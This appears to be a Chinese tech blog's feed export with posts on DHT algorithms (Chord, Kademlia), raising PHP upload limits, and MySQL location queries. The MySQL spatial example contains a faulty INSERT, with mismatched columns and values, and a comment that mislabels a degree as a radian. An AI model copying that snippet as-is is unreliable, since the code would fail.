<p>首先每个节点会有若干个其他节点的联系方式(IP 地址, 端口), 称之为路由表. 一般来说一个有着 $n$ 个节点的分布式哈希表中, 一个节点的路由表的长度为 $\mathrm{O}(\log{n})$. 每个节点都会按照特定的规则构建路由表, 最终所有的节点会形成一张网络. 从一个节点发出的消息会根据特定的路由规则, 沿着网络逐步接近目标节点, 最终达到目标节点. 在有着 $n$ 个节点的分布式哈希表中, 这个过程的转发次数通常为 $\mathrm{O}(\log{n})$ 次.</p>
<p><strong>自我组织(self-organization)</strong></p>
<p>分布式哈希表中的节点都是由各个用户组成, 随时有用户加入, 离开或失效; 并且分布式哈希表没有中央服务器, 也就是说着这个系统完全没有管理者. 这意味着分配地址, 构建路由表, 节点加入, 节点离开, 排除失效节点等操作都要靠自我组织策略实现.</p>
<p>要发布或获取资源, 首先要有节点加入. 一个节点加入通常有以下几步. 首先, 一个新节点需要通过一些外部机制联系分布式哈希表中的任意一个已有节点; 接着新节点通过请求这个已有节点构造出自己的路由表, 并且更新其他需要与其建立连接的节点的路由表; 最后这个节点还需要取回它所负责的资源.</p>
<p>此外我们必须认为节点的失效是一件经常发生的事, 必须能够正确处理它们. 例如, 在路由的过程中遇到失效的节点, 会有能够替代它的其他节点来完成路由操作; 会定期地检查路由表中的节点是否有效; 将资源重复存储在多个节点上以对抗节点失效等. 另外分布式哈希表中的节点都是自愿加入的, 也可以自愿离开. 节点离开的处理与节点失效类似, 不过还可以做一些更多的操作, 比如说立即更新其他节点的路由表, 将自己的资源转储到其他节点等.</p>
<h2 id="3-Chord-算法"><a href="#3-Chord-算法" class="headerlink" title="3. Chord 算法"></a>3. Chord 算法</h2><p>上一节简单介绍了 P2P 网络和分布式哈希表, 现在我们来讨论它的一个具体实现. 分布式哈希表有很多中实现, Ion Stoica 和 Robert Morris 等人在 2001 年的一篇论文中提出了 <a href="https://dl.acm.org/doi/abs/10.1145/964723.383071" target="_blank" rel="noopener">Chord 算法</a>. Chord 算法比较简洁, 也很漂亮, 这里我们先介绍它.</p>
<h3 id="3-1-地址管理"><a href="#3-1-地址管理" class="headerlink" title="3.1 地址管理"></a>3.1 地址管理</h3><p>正如 <a href="#2-3-分布式哈希表">2.3</a> 节所述, Chord 使用一个 m 位整数作为节点和资源的唯一标识. 也就是说标识的取值范围为 $0$ 至 $2^m-1$ 的整数. Chord 把所有的 ID 排列成一个环, 从小到大顺时针排列, 首尾相连. 为了方便起见, 我们称每个 ID 都先于它逆时针方向的 ID, 后于它顺时针方向的 ID. 每个节点都能在这个环中找到自己的位置; 而对于 Key 值为 k 的资源来说, 它总是会被第一个 ID 先于或等于 k 的节点负责. 我们把负责 k 的节点称为 k 的后继, 记作 $successor(k)$. 例如, 如下图所示, 在一个 m = 4 的 Chord 环中, 有 ID 分别为 0, 1, 4, 8, 11, 14 的六个节点. Key 为 1 的资源被 ID 为 1 的节点负责, Key 为 5 的资源被 ID 为 8 的节点负责, Key 为 15 的资源被 ID 为 0 的节点负责. 也就是有 $successor(1)=1$, $successor(5)=8$, $successor(15)=0$.</p>
<p><img src="/articles/分布式哈希表-DHT-和P2P技术/dht-and-p2p_5.png" alt="chord-ring"></p>
<h3 id="3-2-路由算法"><a href="#3-2-路由算法" class="headerlink" title="3.2 路由算法"></a>3.2 路由算法</h3><p>在 Chord 算法中, 每个节点都保存一个长度为 m 的路由表, 存储至多 m 个其他节点的信息, 这些信息能让我们联系到这些节点. 假设一个节点的 ID 为 n(以下简称节点 n), 那么它的路由表中第 i 个节点应为第一个 ID 先于或等于 $n+2^{i-1}$ 的节点, 即 $successor(n+2^{i-1})$, 这里 $1 \leqslant i \leqslant m$. 我们把 n 的路由表中的第 i 个节点记作 $n.finger[i]$. 显然, 路由表中的第一个节点为顺时针方向紧挨着 n 的节点, 我们通常称它为节点 n 的后继节点, 记作 $n.successor$.</p>
<p><img src="/articles/分布式哈希表-DHT-和P2P技术/dht-and-p2p_6.png" alt="route-table"></p>
<p>有了这个路由表, 我们就可以快速地寻址了. 假设一个节点 n 需要寻找 Key 值为 k 的资源所在的节点, 即寻找 $successor(k)$, 它首先判断 k 是否落在区间 $(n, n.successor]$ 内; 如果是, 则说明这个 Key 由它的后继负责. 否则 n 从后向前遍历自己的路由表, 直到找到一个 ID 后于 k 的节点, 然后把 k 传递给这个节点由它执行上述查找工作, 直到找到为止.</p>
<p><img src="/articles/分布式哈希表-DHT-和P2P技术/dht-and-p2p_7.png" alt="route-table"></p>
<p>上图展示了从节点 4 寻找节点 1 的过程. 节点 4 的路由表中的节点分别为 8, 11, 14. 它首先会从后向前找到路由表中第一个后于 1 的节点为 14, 然后就请求 14 帮忙寻找 1. 节点 14 的路由表分别为 0, 4, 8; 同样地, 14 就会请求节点 0 帮忙寻找 1. 最终节点 0 找到它的后继即为节点 1.</p>
<p>可以看到, 整个查找过程是逐步逼近目标目标节点的. 离目标节点越远, 跳跃的距离就越长; 离目标节点越近, 跳跃的距离就越短, 越精确. 若整个系统有 N 个节点, 查找进行的跳跃次数就为 $\mathrm{O}(\log N)$.</p>
<h3 id="3-3-自我组织"><a href="#3-3-自我组织" class="headerlink" title="3.3 自我组织"></a>3.3 自我组织</h3><p><strong>节点加入</strong></p>
<p>一个节点要想加入 Chord 并不难. 上一节说了, Chord 系统中的任意一个节点都能对任意 Key k 找到它的后继 $successor(k)$. 首先, 新节点 $n$ 使用一些算法生成自己的 ID, 然后它需要联系系统中的任意一个节点 $n’$, 让他帮忙寻找 $successor(n)$. 显然, $successor(n)$ 即是 n 的后继节点, 同时也是它路由表中的第一个节点. 接下来它再请求 $n’$ 帮忙分别寻找 $successor(n + 2^1)$, $successor(n + 2^2)$, 等等, 直到构建完自己的路由表.</p>
<p>构建完自己的路由表后, n 基本上算是加入 Chord 了. 不过还不够, 因为这时其他的节点还不知晓它的存在. n 加入后, 有些节点的路由表中本该指向 n 的指针却仍指向 n 的后继. 这个时候就需要提醒这些节点更新路由表. 哪些节点需要更新路由表呢? 我们只需把操作反过来: 对所有的 $1 \leqslant i \leqslant m$, 找到第一个<u>后于</u> $n - 2^{i-1}$ 的节点. 这与寻找后继相同, 就不再赘述了.</p>
<p>最后, 新节点 n 还需要取回它负责的所有资源. n 只需联系它的后继取回它后继所拥有的所有 Key 后于或等于 n 的资源即可.</p>
<p><strong>处理并发问题</strong></p>
<p>考虑多个节点同时加入 Chord. 如果使用上述方法, 就有可能导致路由表不准确. 为此, 我们不能在新节点加入的时候一次性更新所有节点的路由表. Chord 算法非常重要的一点就是保证每个节点的后继节点都是准确的. 为了保证这一点, 我们希望每个节点都能和它的后继节点双向通信, 彼此检查. 因此我们给每个节点添加一个属性 $n.predecessor$ 指向它的前序节点. 然后, 我们让每个节点定期执行一个操作, 称之为 $stabilize$. 在 $stabilize$ 操作中, 每个节点 $n$ 都会向自己的后继节点 $s$ 请求获取 $s$ 的前序节点 $x$. 然后 $n$ 会检查 $x$ 是否更适合当它的后继, 如果是, $n$ 就它自己的后继更新为 $x$. 同时 $n$ 告诉自己的后继 $s$ 自己的存在, $s$ 又会检查 $n$ 是否更适合当它的前序, 如果是, $s$ 就把自己的前序更新为 $n$. 这个操作足够简单, 又能够保证 Chord 环的准确性.</p>
<p>当新节点 $n$ 加入 Chord 时, 首先联系已有节点 $n’$ 获取到 $n.successor$. $n$ 除了设置好自己的后继之外, 什么都不会做; 此时 $n$ 还没有加入 Chord 环. 这要等到 $stabilize$ 执行之后: 当 $n$ 执行 $stabilize$ 时, 会通知它的后继更新前序为 $n$; 当 $n$ 真正的前序 $p$ 执行 $stabilize$ 时会把自己的后继修正为 $n$, 并通知 $n$ 设置前序为 $p$. 这样 $n$ 就加入到 Chord 环中了. 这样的操作在多个节点同时加入时也是正确有效的.</p>
<p>此外每个节点 $n$ 还会定期修复自己的路由表, 以确保能指向正确的节点. 具体的做法是随机选取路由表中的第 $i$ 个节点, 查找并更新 $n.finger[i]$ 为 $successor(n+2^{i-1})$. 由于 $n$ 的后继节点始终是正确的, 所以这个查找操作始终是有效的.</p>
<p><strong>节点失效与离开</strong></p>
<p>一旦有节点失效, 势必会造成某个节点的后继节点失效. 而后继节点的准确性对 Chord 来说至关重要, 它的失效意味着 Chord 环断裂, 可能导致查找失效, $stabilize$ 操作无法进行. 为了解决这个问题, 一个节点通常会维护多个后继节点, 形成一个后继列表, 它的长度通常是 m. 这样的话, 当一个节点的后继节点失效后, 它会在后继列表中寻找下一个替代的节点. 此外一个节点的失效意味着这个节点上资源的丢失, 因此一个资源除了存储在负责它的节点 n 上之外, 还会被重复地存储在 n 的若干个后继节点上.</p>
<p>节点离开的处理与节点失效相似, 不同的是节点离开时可以做一些额外的操作, 例如通知它周围的节点立即执行 $stabilize$ 操作, 把资源转移到它的后继, 等等.</p>
<h2 id="4-Kademlia-算法"><a href="#4-Kademlia-算法" class="headerlink" title="4. Kademlia 算法"></a>4. Kademlia 算法</h2><p>Petar Maymounkov 和 David Mazières 在 2002 年的一篇论文中提出了 <a href="https://link.springer.com/chapter/10.1007/3-540-45748-8_5" target="_blank" rel="noopener">Kademlia 算法</a>,相比与 Chord 算法, Kademlia 算法容错度更高, 效率也高于 Chord, 也更巧妙合理.</p>
<h3 id="4-1-地址管理"><a href="#4-1-地址管理" class="headerlink" title="4.1 地址管理"></a>4.1 地址管理</h3><p>Kademlia 同样使用 m 位整数作为节点和资源的唯一标识. 与 Chord 中的 “区间负责制” 不同, Kademlia 中的资源都是被离它最近的节点负责. 出于容错考虑, 每个资源通常都被距离它最近的 k 个节点负责, 这里 k 是一个常量, 通常取 k 使得在系统中任意 k 个节点都不太可能在一小时之内同时失效, 比如取 k = 20. 有趣的是, 这里的 “距离” 并不是数值之差, 而是通过异或运算得出的. 在 Kademlia 中, 每个节点都可以看作一颗高度为 m + 1 的二叉树上的叶子节点. 把 ID 二进制展开, 从最高位开始, 自根节点逢 1 向左逢 0 向右, 直到抵达叶子节点. 如下图所示.</p>
<p><img src="/articles/分布式哈希表-DHT-和P2P技术/dht-and-p2p_8.png" alt="binary-tree"></p>
<p>Kademlia 的巧妙之处就是定义两个 ID $x$ 和 $y$ 之间的距离为 $x \oplus y$. 异或运算的特点是异为真同为假, 如果两个 ID 高位相异低位相同, 它们异或的结果就大; 如果它们高位相同低位相异, 异或的结果就小. 这与二叉树中叶子的位置分布是一致的: 如果两个节点共有的祖先节点少(高位相异), 它们的距离就远; 反之, 如果共有的祖先节点多(高位相同), 它们的距离就近. 上图标注了一些节点之间的距离, 大家可以感受一下.</p>
<p>异或运算的另一个重要性质是, 异或的逆运算仍是异或. 即如果有 $x \oplus y = d$ 则 $x \oplus d = y$. 这就意味着对于每个节点, 给的一个距离 $d$, 至多有一个与其距离为 $d$ 节点. 这样一来 Kademlia 的拓扑结构是<strong>单向的(unidirectional)</strong>. 单向性确保不管查找从哪个节点开始, 同一 Key 的所有查找都会沿着同一路径收敛.</p>
<h3 id="4-2-路由算法"><a href="#4-2-路由算法" class="headerlink" title="4.2 路由算法"></a>4.2 路由算法</h3><p>对于任意一个给定节点, 我们将二叉树从根节点开始不断向下分成一系列不包含该节点的子树. 最高的子树由不包含该节点的二叉树的一半组成, 下一个子树又由不包含该节点的剩余树的一半组成, 以此类推. 如果这个二叉树的高度为 m + 1, 我们最终会得到 m 个子树. 接着在每个子树中任取 k 个节点, 形成 m 个 <strong>k 桶(k-bucket)</strong>, 这 m 个 k 桶就是 Kademlia 节点的路由表. 我们定义最小子树中取得的节点为第 0 个 k 桶, 次小的子树中取得的节点为第 1 个 k 桶, 以此类推. 不难看出, 对于每个 $0 \leqslant i &lt; m$, 第 $i$ 个 k 桶中节点与当前节点的距离总是在区间 $[2^i, 2^{i+1})$ 之内. 下图展示了 m = 3, k = 2 时节点 101 的 k 桶.</p>
<p><img src="/articles/分布式哈希表-DHT-和P2P技术/dht-and-p2p_9.png" alt="k-bucket"></p>
<p>Kademlia 中每个节点都有一个基础操作, 称为 <code>FIND_NODE</code> 操作. <code>FIND_NODE</code> 接受一个 Key 作为参数, 返回当前节点所知道的 k 个距离这个 Key 最近的节点. 基于 k 桶, 找到这 k 个最近的节点很容易: 先求出这个 Key 与当前节点的的距离 $d$; 上面说了, 第 $i$ 个 k 桶中节点与当前节点的距离总是在区间 $[2^i, 2^{i+1})$ 之内, 这些区间都不会互相重叠, 那么显然 $d$ 落在的区间所属的 k 桶中的节点就是距离这个 Key 最近的节点. 如果这个 k 桶中的节点不足 k 个, 则在后一个 k 桶中取节点补充, 如果还不够就再在后一个 k 桶中取. 如果这个节点所有的 k 桶中的节点数之和都不足 k 个, 就返回它所知道的所有节点.</p>
<p>有了 <code>FIND_NODE</code> 操作, 我们就可以定义 Kademlia 中最重要的一个过程, <strong>节点查找(node lookup)</strong>. 节点查找要做的是, 给定一个 Key, 找出整个系统中距离它最近的 k 个节点. 这是一个递归过程: 首先初始节点调用自己的 <code>FIND_NODE</code>, 找到 k 个它所知的距离 Key 最近的节点. 接下来我们在这 k 个节点中取 $\alpha$ 个最近的节点, 同时请求它们为 Key 执行 <code>FIND_NODE</code>. 这里的 $\alpha$ 也是一个常量, 作用是同时请求提高效率, 比如取 $\alpha = 3$.</p>
<p>在接下来的递归过程中, 初始节点每次都在上一次请求后返回的节点中取 $\alpha$ 个最近的, 并且未被请求过的节点, 然后请求它们为 Key 执行 <code>FIND_NODE</code>, 以此类推. 每执行一次, 返回的节点就距离目标近一点. 如果某次请求返回的节点不比上次请求返回的节点距目标 Key 近, 就向所有未请求过的节点请求执行 <code>FIND_NODE</code>. 如果还不能获取更近的节点, 过程就终止. 这时我们在其中取 k 个距离 Key 最近的节点, 就是节点查找的结果.</p>
<p>Kademlia 的大多数操作都基于节点查找. 发布资源时, 只需为资源的 Key 执行节点查找, 获取 k 个距离资源最近的节点, 把资源存储在这些节点上.</p>
<p>获取资源也类似, 也只需为目标资源的 Key 执行节点查找, 不同的是一旦遇到拥有目标资源的节点就停止查找. 此外, 一旦一个节点查找成功, 它就会把资源缓存在离自己最近的节点上. 因为 Kademlia 的拓扑结构是单向的, 其他离目标资源比自己远的节点在查找时就很可能会经由缓存的节点, 这样就能提前终止查找, 提高了查找效率.</p>
<h3 id="4-3-自我组织"><a href="#4-3-自我组织" class="headerlink" title="4.3 自我组织"></a>4.3 自我组织</h3><p><strong>k 桶的维护</strong></p>
<p>所有的 k 桶都遵循<strong>最近最少使用(Least Recently Used, LRU)</strong>淘汰法. 最近最少活跃的节点排在 k 桶的头部, 最近最多活跃的节点排在 k 桶尾部. 当一个 Kademlia 节点接收到任何来自其他节点的消息(请求或响应)的时候, 都会尝试更新相应的 k 桶. 如果这个节点在接收者对应的 k 桶中, 接收者就会把它移动到 k 桶的尾部. 如果这个节点不在相应的 k 桶中, 并且 k 桶的节点小于 k 个, 那么接收者就会直接把这个节点插入到这个 k 桶的尾部. 如果相应的 k 桶是满的, 接收者就会尝试 ping 这个 k 桶中最近最少活跃的节点. 如果最近最少活跃的节点失效了, 那么就移除它并且将新节点插入到 k 桶的尾部; 否则就把最近最少活跃的节点移动到 k 桶尾部, 并丢弃新节点.</p>
<p>通过这个机制就能在的通信的同时刷新 k 桶. 为了防止某些范围的 Key 不易被查找的情况, 每个节点都会手动刷新在上一小时未执行查找的 k 桶. 做法是在这个 k 桶中随机选一个 Key 执行节点查找.</p>
<p><strong>节点加入</strong></p>
<p>一个新节点 $n$ 要想加入 Kademlia, 它首先使用一些算法生成自己的 ID, 然后它需要通过一些外部手段获取到系统中的任意一个节点 $n’$, 把 $n’$ 加入到合适的 k 桶中. 然后对自己的 ID 执行一次节点查找. 根据上述的 k 桶维护机制, 在查找的过程中新节点 $n$ 就能自动构建好自己的 k 桶, 同时把自己插入到其他合适节点的 k 桶中, 而无需其他操作.</p>
<p>节点加入时除了构建 k 桶之外, 还应该取回这个节点应负责的资源. Kademlia 的做法是每隔一段时间(例如一个小时), 所有的节点都对其拥有的资源执行一次发布操作; 此外每隔一段时间(例如24小时)节点就会丢弃这段时间内未收到发布消息的资源. 这样新节点就能收到自己须负责的资源, 同时资源总能保持被 k 个距离它最近的节点负责.</p>
<p>如果每个小时所有节点都重发它们所拥有的资源, 就有些浪费了. 为了优化这一点, 当一个节点收到一个资源的发布消息, 它就不会在下一个小时重发它. 因为当一个节点收到一个资源的发布消息, 它就可以认为有 k - 1 个其他节点也收到了这个资源的发布消息. 只要节点重发资源的节奏不一致, 这就能保证每个资源都始终只有一个节点在重发.</p>
<p><strong>节点失效和离开</strong></p>
<p>有了上述 k 桶维护和资源重发机制, 我们不需要为节点的失效和离开做任何其它的工作. 这也是 Kademlia 算法的巧妙之处, 它的容错性要高于其他分布式哈希表算法.</p>
<h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h2><p>这篇文章介绍了 P2P 技术和分布式哈希表, 以及两种分布式哈希表算法, 基本介绍了它们的原理和实现机制. 文本也是笔者对这两篇论文学习的总结, 限于篇幅和笔者的精力, 对于其中的一些实现细节, 策略背后的理论和实验支撑, 算法的证明等未予阐述. 建议想要深入学习的同学阅读参考资料中的内容. 搭建 P2P 架构是一项很有挑战性的工作, 笔者认为即使不从事 P2P 开发, 了解和学习 P2P 技术对于服务器架构方面也是很有帮助的.</p>
<hr>
<p><strong>参考资料</strong></p>
<ul>
<li><a href="https://www.springer.com/us/book/9783540291923" target="_blank" rel="noopener">Peer-to-Peer Systems and Applications</a></li>
<li><a href="https://dl.acm.org/doi/abs/10.1145/964723.383071" target="_blank" rel="noopener">Chord: A scalable peer-to-peer lookup service for internet applications</a></li>
<li><a href="https://link.springer.com/chapter/10.1007/3-540-45748-8_5" target="_blank" rel="noopener">Kademlia: A Peer-to-Peer Information System Based on the XOR Metric</a></li>
</ul>
<style>.posts-expand .post-body img{margin:0 auto; height:300px;}</style>
]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title>修改PHP上传文件大小限制</title>
    <url>/articles/%E4%BF%AE%E6%94%B9PHP%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E5%A4%A7%E5%B0%8F%E9%99%90%E5%88%B6/</url>
    <content><![CDATA[<p>修改PHP上传文件大小限制的方法</p>
<ol>
<li><p>一般的文件上传,除非文件很小.就像一个5M的文件,很可能要超过一分钟才能上传完.但在php中,默认的该页<br>最久执行时间为 30 秒.就是说超过30秒,该脚本就停止执行. 这就导致出现 无法打开网页的情况.这时我们可以修改 <em>max_execution_time*。在php.ini里查找 *max_execution_time</em> 默认是30秒. 改为 <em>max_execution_time = 0</em>，0表示没有限制。</p>
</li>
<li><p>修改 <em>post_max_size</em> 设定 POST 数据所允许的最大大小。此设定也影响到文件上传。php默认的 <em>post_max_size</em> 为2M.如果 POST 数据尺寸大于 <em>post_max_size</em> $_POST 和 $_FILES superglobals 便会为空 <em>post_max_size</em> 改为 <em>post_max_size = 150M</em></p>
</li>
<li><p>但上传文件时最大仍然为 8M. 我们还要改一个参数 <em>upload_max_filesize</em> 表示所上传的文件的最大大小。查找<em>upload_max_filesize</em>,默认为 8M 改为 <em>upload_max_filesize = 100M</em> 另外要说明的是,post_max_size 大于 <em>upload_max_filesize</em> 为佳.</p>
</li>
</ol>
<p>把上述参数修改后，在网络所允许的正常情况下，就可以上传大体积文件了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">max_execution_time = 600</span><br><span class="line"></span><br><span class="line">max_input_time = 600</span><br><span class="line"></span><br><span class="line">memory_limit = 32m</span><br><span class="line"></span><br><span class="line">file_uploads = on</span><br><span class="line"></span><br><span class="line">upload_tmp_dir = /tmp</span><br><span class="line"></span><br><span class="line">upload_max_filesize = 32m</span><br><span class="line"></span><br><span class="line">post_max_size = 32m</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>几种简单方案实现LBS</title>
    <url>/articles/%E5%87%A0%E7%A7%8D%E7%AE%80%E5%8D%95%E6%96%B9%E6%A1%88%E5%AE%9E%E7%8E%B0LBS/</url>
    <content><![CDATA[<style>
.posts-expand .post-body img {
    margin: 0 auto;
}
</style>


<h3 id="方案一：-Mysql"><a href="#方案一：-Mysql" class="headerlink" title="方案一： Mysql"></a>方案一： Mysql</h3><h4 id="通过球面两点距离公式"><a href="#通过球面两点距离公式" class="headerlink" title="通过球面两点距离公式"></a>通过球面两点距离公式</h4><blockquote>
<p>$ AB = R * \arccos{( \cos{wA} * \cos{wB} * \cos{jB-jA} + \sin{wA}*\sin{wB})}$<br>其中 A（jA,wA）和B（jB，wB）,推导过程见<a href="http://www.360doc.com/content/14/0117/10/325430_345890919.shtml" target="_blank" rel="noopener">这里</a></p>
</blockquote>
<p><img src="/articles/几种简单方案实现LBS/1.png" alt="示意图"></p>
<p>对于大部分已经使用MySQL的应用来说，使用这种方案没有任何迁移和部署成本，但使用SQL语句进行查询的缺点也显而易见，每条SQL的计算量都会非常大，性能将会是严重的问题。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> address (</span><br><span class="line">	<span class="keyword">id</span> <span class="built_in">INT</span> (<span class="number">11</span>) AUTO_INCREMENT,</span><br><span class="line">	<span class="keyword">name</span> <span class="built_in">CHAR</span> (<span class="number">80</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">	lat <span class="built_in">CHAR</span> (<span class="number">10</span>),</span><br><span class="line">	lng <span class="built_in">CHAR</span> (<span class="number">10</span>),</span><br><span class="line">	PRIMARY <span class="keyword">KEY</span> (<span class="keyword">id</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 插入测试数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> address(<span class="keyword">name</span>,lat,lng) <span class="keyword">VALUES</span></span><br><span class="line"> (<span class="string">'成都'</span>, <span class="number">30.659673</span>,<span class="number">104.068433</span>)</span><br><span class="line">,(<span class="string">'绵阳'</span>, <span class="number">31.473909</span>,<span class="number">104.680961</span>)</span><br><span class="line">,(<span class="string">'泸州'</span>, <span class="number">28.876403</span>,<span class="number">105.450251</span>) </span><br><span class="line">,(<span class="string">'德阳'</span>, <span class="number">31.134847</span>,<span class="number">104.408441</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询</span></span><br><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    <span class="keyword">id</span>,<span class="keyword">name</span>, (</span><br><span class="line">      <span class="number">6371</span> * <span class="keyword">acos</span> (    <span class="comment"># 3959是地球半径的英里，6371是地球半径的千米</span></span><br><span class="line">      <span class="keyword">cos</span> ( <span class="keyword">radians</span>(<span class="number">30.452034</span>) )</span><br><span class="line">      * <span class="keyword">cos</span>( <span class="keyword">radians</span>( lat ) )</span><br><span class="line">      * <span class="keyword">cos</span>( <span class="keyword">radians</span>( lng ) - <span class="keyword">radians</span>(<span class="number">106.644153</span>) )</span><br><span class="line">      + <span class="keyword">sin</span> ( <span class="keyword">radians</span>(<span class="number">30.452034</span>) )</span><br><span class="line">      * <span class="keyword">sin</span>( <span class="keyword">radians</span>( lat ) )</span><br><span class="line">    )</span><br><span class="line">) <span class="keyword">AS</span> distance</span><br><span class="line"><span class="keyword">FROM</span> address</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> distance</span><br><span class="line"><span class="keyword">LIMIT</span> <span class="number">0</span> , <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或通过 st_distance_sphere 函数计算</span></span><br><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">  <span class="keyword">name</span>,</span><br><span class="line">	<span class="keyword">round</span>( st_distance_sphere ( point ( <span class="number">106.644153</span>, <span class="number">30.452034</span> ), point ( lng, lat ))/ <span class="number">1000</span>, <span class="number">2</span> ) <span class="keyword">AS</span> distance </span><br><span class="line"><span class="keyword">FROM</span> address </span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> distance <span class="keyword">ASC</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 查询结果</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> 3	泸州	209.7647687926011</span></span><br><span class="line"><span class="comment"> 2	绵阳	218.97099731812352</span></span><br><span class="line"><span class="comment"> 4	德阳	226.64161541779157</span></span><br><span class="line"><span class="comment"> 1	成都	247.70751793832144</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<h4 id="通过空间存储-spatial"><a href="#通过空间存储-spatial" class="headerlink" title="通过空间存储(spatial)"></a>通过空间存储(spatial)</h4><p>MySQL的空间扩展（MySQL Spatial Extensions），它允许在MySQL中直接处理、保存和分析地理位置相关的信息，但是需要手动排序（请忽略distance字段）。文档可见<a href="https://dev.mysql.com/doc/refman/8.0/en/spatial-types.html" target="_blank" rel="noopener">这里</a></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> address (</span><br><span class="line">	<span class="keyword">id</span> <span class="built_in">INT</span> (<span class="number">11</span>) AUTO_INCREMENT,</span><br><span class="line">	<span class="keyword">name</span> <span class="built_in">CHAR</span> (<span class="number">80</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">	point POINT <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">	PRIMARY <span class="keyword">KEY</span> (<span class="keyword">id</span>)</span><br><span class="line">);</span><br><span class="line"><span class="comment"># 创建索引</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> address <span class="keyword">ADD</span> SPATIAL <span class="keyword">INDEX</span>(point);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 插入测试数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> address(<span class="keyword">name</span>,point,lat,lng) <span class="keyword">VALUES</span></span><br><span class="line"> (<span class="string">'成都'</span>, GeomFromText(<span class="string">'POINT(30.659673 104.068433)'</span>))</span><br><span class="line">,(<span class="string">'绵阳'</span>, GeomFromText(<span class="string">'POINT(31.473909 104.680961)'</span>))</span><br><span class="line">,(<span class="string">'泸州'</span>, GeomFromText(<span class="string">'POINT(28.876403 105.450251)'</span>)) </span><br><span class="line">,(<span class="string">'德阳'</span>, GeomFromText(<span class="string">'POINT(31.134847 104.408441)'</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询： 查找坐标(30.452034,106.644153)附近 220 公里内的城市</span></span><br><span class="line"><span class="keyword">SELECT</span>  <span class="keyword">id</span>,<span class="keyword">name</span>,(</span><br><span class="line">          <span class="number">6371</span> * <span class="keyword">acos</span> (    <span class="comment"># 3959是地球半径的英里，6371是地球半径的千米</span></span><br><span class="line">          <span class="keyword">cos</span> ( <span class="keyword">radians</span>(<span class="number">30.452034</span>) )</span><br><span class="line">          * <span class="keyword">cos</span>( <span class="keyword">radians</span>( lat ) )</span><br><span class="line">          * <span class="keyword">cos</span>( <span class="keyword">radians</span>( lng ) - <span class="keyword">radians</span>(<span class="number">106.644153</span>) )</span><br><span class="line">          + <span class="keyword">sin</span> ( <span class="keyword">radians</span>(<span class="number">30.452034</span>) )</span><br><span class="line">          * <span class="keyword">sin</span>( <span class="keyword">radians</span>( lat ) )</span><br><span class="line">        )</span><br><span class="line">    ) <span class="keyword">AS</span> distance <span class="comment"># 仅供结果可视，非必须</span></span><br><span class="line">    <span class="keyword">FROM</span>    address</span><br><span class="line">    <span class="keyword">WHERE</span>   MBRContains (</span><br><span class="line">                LineString(</span><br><span class="line">                        Point (</span><br><span class="line">                                <span class="number">30.452034</span> + <span class="number">220</span> / ( <span class="number">111.1</span> / <span class="keyword">COS</span>(<span class="keyword">RADIANS</span>(<span class="number">30.452034</span>))), // <span class="number">1</span>弧度 = <span class="number">111.1</span></span><br><span class="line">                                <span class="number">106.644153</span> + <span class="number">220</span> / <span class="number">111.1</span></span><br><span class="line">                          ),</span><br><span class="line">                        Point (</span><br><span class="line">                                <span class="number">30.452034</span> - <span class="number">220</span> / ( <span class="number">111.1</span> / <span class="keyword">COS</span>(<span class="keyword">RADIANS</span>(<span class="number">30.452034</span>))),</span><br><span class="line">                                <span class="number">106.644153</span> - <span class="number">220</span> / <span class="number">111.1</span></span><br><span class="line">                        ) </span><br><span class="line">                ), point)</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 查询结果</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> 2	绵阳	218.97099731812352</span></span><br><span class="line"><span class="comment"> 3	泸州	209.7647687926011</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<h4 id="通过Geohash算法"><a href="#通过Geohash算法" class="headerlink" title="通过Geohash算法"></a>通过Geohash算法</h4><p>GeoHash是一种地址编码，通过切分地图区域为小方块（切分次数越多，精度越高），它能把二维的经纬度编码成一维的字符串。也就是说，理论上geohash字符串表示的并不是一个点，而是一个矩形区域，只要矩形区域足够小，达到所需精度即可。（MongoDB的索引也是基于geohash）</p>
<p>如：wm3yr31d252414ux就是目前我所在的位置，降低一些精度，就会是wm3yr31d2524，再降低一些精度，就会是wm3yr。</p>
<p>所以这样一来，我们就可以在MySQL中用LIKE ‘wm3yr%’来限定区域范围查询目标点，并且可以对结果集做缓存。更不会因为微小的经纬度变化而无法用上数据库的Query Cache。</p>
